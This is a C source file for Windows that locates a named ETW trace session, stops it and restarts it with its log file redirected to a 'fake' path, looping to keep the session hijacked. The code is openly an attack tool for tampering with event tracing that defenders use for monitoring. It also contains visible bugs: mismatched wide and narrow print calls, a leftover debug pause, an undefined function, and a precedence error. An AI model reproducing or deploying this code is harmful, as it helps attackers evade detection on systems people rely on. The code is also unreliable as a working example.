#include<stdio.h>
#include<Windows.h>
#include<evntrace.h>
#include <conio.h>
#include <strsafe.h>
#include <wmistr.h>
#include <shellapi.h>
#include <tchar.h>


#define TARGET_SESSION_NAME L"Test Session"
#define MAXIMUM_SESSIONS 64  // maximum number of running sessions in the system
#define MAXSTR 1024
#define FAKE_LOG_FILE L"C:\\Windows\\Temp\\hijacked.etl" // the fake log file path


BOOL IsSessionHijacked(IN PEVENT_TRACE_PROPERTIES SessionInfo) {
	// calculating the address of the log file name
	wprintf("I am here");
	getchar();
	LPTSTR LogFileName = (LPTSTR)((PUCHAR)SessionInfo + SessionInfo->LogFileNameOffset);
	// comparing the obtained log file name with the FAKE_LOG_FILE path
	return (*(ULONG_PTR*)LogFileName != NULL && wcscmp(LogFileName, FAKE_LOG_FILE) == 0) ? TRUE : FALSE;
}


VOID HijackEtwSession(IN PEVENT_TRACE_PROPERTIES SessionInfo) {

	while (TRUE) {

		ULONG bError = ERROR_SUCCESS;

		TRACEHANDLE SessionHandle = NULL;

		/// verify if the target session running 
		if ((bError = QueryTraceW((TRACEHANDLE)0, TARGET_SESSION_NAME, SessionInfo)) != ERROR_SUCCESS && bError != ERROR_WMI_INSTANCE_NOT_FOUND) {
			wprintf("\t[-] QueryTraceW Failed With Error %d \n", bError);
			return;
		}

		if (bError == ERROR_WMI_INSTANCE_NOT_FOUND) {
			wprintf("[-] The Session \"%s\" is Not Running Anymore \n", TARGET_SESSION_NAME);
			wprintf("[-] Retrying To Find The Target Session ... \n");

			// sleep for a while and retry
			goto _Retry;
		}
		// Successfully queried the target session
		wprintf("\t[+] Successfully Queried The Target Session \n");

		// check if the session is already hijacked
		if (IsSessionHijacked(SessionInfo)) {
			wprintf("[-] The Session \"%s\" is Already Hijacked \n", TARGET_SESSION_NAME);
			goto _Retry;
		}

		// hijacking  the target session
		wprintf("\t[i] Restarting Target Session With Hijacked Settings: \n");

		// stopping the target session
		wprintf("\t[i] Stopping The Target Session \"%s\" ... \n", TARGET_SESSION_NAME);
		if ((bError = StopTraceW((TRACEHANDLE)0, TARGET_SESSION_NAME, SessionInfo)) != ERROR_SUCCESS) {
			wprintf("\t[-] StopTraceW Failed With Error %d \n", bError);
			return;
		}

		wprintf("\t[+] DONE ... \n");

		// modifying the session properties to the malicious ones
		// updating the log file name to the FAKE_LOG_FILE path by copying it to the ( LogFileNameOffset + SessionInfo ) address
		wprintf("\t[i] Modifying The Trace File Name   ... \n");
		wcscpy_s((LPWSTR)((PUCHAR)SessionInfo + SessionInfo->LogFileNameOffset), MAXSTR, FAKE_LOG_FILE);
		wprintf("\t[+] DONE ... \n");

		// restarting the target session
		wprintf("\t[i] Restarting The Target Session \"%s\" ... \n", TARGET_SESSION_NAME);
		if (bError = StartTraceW(&SessionHandle, (LPCWSTR)TARGET_SESSION_NAME, SessionInfo) != ERROR_SUCCESS) {
			wprintf("\t[-] StartTraceW Failed With Error %d \n", bError);
			return;
		}

		wprintf("\t[+] DONE ... \n");



	_Retry:
		Sleep(5000);
	}

}


int main() {

	PEVENT_TRACE_PROPERTIES SessionInfo[MAXIMUM_SESSIONS] = { 0 };
	PEVENT_TRACE_PROPERTIES Storage, StoragePtr = NULL;

	ULONG SizeOfOneSession = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR); // size of one element (session)
	ULONG SizeNeeded = MAXIMUM_SESSIONS * SizeOfOneSession;
	ULONG SessionCounter = 0;
	ULONG uStatus = ERROR_SUCCESS;
	ULONG SessionCount = NULL;
	ULONG ReturnCount = 0;

	LPTSTR SessionName = NULL;

	BOOL bFound = FALSE;

	Storage = (PEVENT_TRACE_PROPERTIES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SizeNeeded);
	if (Storage == NULL) {
		return -1;
	}

	StoragePtr = Storage;

	// Initializing the SessionInfo structur
	for (SessionCounter = 0; SessionCounter < MAXIMUM_SESSIONS; SessionCounter++) {

		// populate the require elements ( according to microsoft)
		Storage->Wnode.BufferSize = SizeOfOneSession;
		Storage->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
		Storage->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + MAXSTR * sizeof(TCHAR);

		// saving the session pointers in array
		SessionInfo[SessionCounter] = Storage;

		// move to the next structur
		Storage = (PEVENT_TRACE_PROPERTIES)((PUCHAR)Storage + Storage->Wnode.BufferSize);

	}

	// Querying all the running sessions  
	uStatus = QueryAllTracesW(SessionInfo, MAXIMUM_SESSIONS, &ReturnCount);
	if (uStatus == ERROR_SUCCESS) {

		// traversing the running sessions
		for (SessionCount = 0; SessionCount < ReturnCount; SessionCount++) {

			// check if the session name exist
			if ((SessionInfo[SessionCount]->LoggerNameOffset > 0) && (SessionInfo[SessionCount]->LoggerNameOffset < SessionInfo[SessionCount]->Wnode.BufferSize)) {

				// calculating the address of the session name
				SessionName = (LPTSTR)((PUCHAR)SessionInfo[SessionCount] + SessionInfo[SessionCount]->LoggerNameOffset);
			}
			else {
				SessionName = NULL;
			}

			// comparing the obtained session name with the target session name
			if (SessionName != NULL && wcscmp(SessionName, TARGET_SESSION_NAME) == 0) {

				//session found
				wprintf("[i] Found target ETW tracing session, hijacking ...\n");

				// hijack the target session
				HijackEtwSession(SessionInfo[SessionCount]);

				bFound = TRUE;
				break;
			}
		}
	}

	if (!bFound)
		wwprintf(L"[-] The Session \"%s\" Was Not Found \n", TARGET_SESSION_NAME);

	// cleaning the allocated memory
	HeapFree(GetProcessHeap(), 0, StoragePtr);

	return 0;
}